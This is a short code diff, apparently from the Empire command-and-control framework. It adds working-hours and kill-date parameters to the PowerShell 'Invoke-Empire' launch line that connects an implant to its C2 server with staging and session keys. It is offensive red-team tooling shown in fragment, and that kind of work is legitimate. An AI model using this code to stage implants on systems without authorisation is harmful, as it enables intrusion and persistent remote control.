@@ -788,8 +788,15 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
 
             if options["Language"]["Value"] == "powershell":
                 launch_code = (
-                    "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';"
-                    % (host, staging_key, session_key, session_id)
+                    "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s' -WorkingHours '%s' -KillDate '%s';"
+                    % (
+                        host,
+                        staging_key,
+                        session_key,
+                        session_id,
+                        working_hours,
+                        kill_date,
+                    )
                 )
                 full_agent = comms_code + "\n" + agent_code + "\n" + launch_code
                 return full_agent
